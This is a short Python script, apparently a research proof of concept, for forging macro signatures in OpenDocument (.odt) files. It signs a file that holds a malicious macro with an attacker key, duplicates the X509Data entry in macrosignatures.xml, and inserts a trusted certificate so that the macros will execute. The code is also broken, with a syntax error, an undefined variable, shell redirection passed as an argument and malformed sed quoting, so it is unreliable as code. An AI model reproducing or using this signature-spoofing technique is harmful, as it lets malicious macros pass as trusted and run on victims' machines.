import sys
import subprocess

# receive input .odt file (it already contains the malicious macro) (note this is the path)
in_file = sys.argv[1]

# create an attacker certificate with openssl (optional)

# sign the .odt file with attacker certificate
priv_key = "../attacker_cert/privkey.pem"
subprocess.run(["openssl", "dgst", "-sha256", "-sign", priv_key_path, "-out digest", in_file])

# unzip .odt file in new (temp) folder
subprocess.run(["mkdir". "temp"])
subprocess.run(["cd", "temp"])
subprocess.run(["unzip", in_file])

# cd META-INF and cat META-INF/macrosignatures.xml
subprocess.run(["cd", "META-INF"])

# in this file, find <X509Data></X509Data>, duplicate this object and append it after </x509Data>
macro_file_name = 'macrosignatures.xml'
subprocess.run(["sed", "-n", """'/<X509Data>/,/<\/X509Data>/{p; /<\/X509Data>/p}'""", macro_file_name ,">", macro_file_name])

# change the value of <X509Certificate> within the second <X509Data> object 
# with a trusted public certificate (this allows macros to be executed)
trusted_cert = '/Users/lucas/Documents/elenis_workspace/DocumentSignatureValidator/elenis_files/valid_cert/pubkey/valid.p12'
subprocess.run(["sed", """'0,/<X509Certificate>/s//""", trusted_cert, """/2'""", macro_file_name])

# 

# (optional) use DocuCSV tool to check if signature shows up as legit or not
